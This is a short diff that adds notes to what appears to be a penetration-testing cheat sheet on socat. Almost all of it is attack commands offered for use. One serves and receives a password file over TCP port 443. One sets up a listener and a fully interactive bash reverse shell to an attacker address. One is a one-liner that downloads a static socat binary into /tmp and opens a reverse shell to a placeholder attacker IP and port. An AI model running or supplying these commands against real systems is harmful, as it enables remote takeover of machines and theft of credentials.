@@ -1,1 +1,13 @@
+- socat:
+    > server > sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+    > client > socat TCP4:192.168.1.x:443 file:recieved_secret_passwords.txt,create
 
+Socat
+Client listen:
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
+
+Server open port and reverse connect:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.x:4444 
+
+Server reverse shell without socat installed:
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR IP>:<YOUR PORT>
